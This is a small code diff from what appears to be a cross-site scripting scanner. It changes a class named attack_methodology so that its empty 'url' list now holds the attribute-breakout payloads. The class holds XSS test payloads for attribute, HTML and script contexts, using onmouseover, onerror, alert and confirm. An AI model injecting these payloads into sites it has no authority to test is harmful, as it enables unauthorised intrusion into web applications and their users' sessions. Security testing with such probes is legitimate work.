@@ -5,7 +5,7 @@ class attack_methodology:
     attr    = ['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
     html    = ['<img src=x onerror="alert(1)">']
     script  = ['"; confirm(1); "', "'; confirm(1); '",  '</script><script>alert(1)</script>']
-    url     = [] 
+    url     = ['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
 
     def get_attack_payload(self, context, presence, double_quotes, single_quotes, lessthan_sign, forward_slash):
         payloads = []
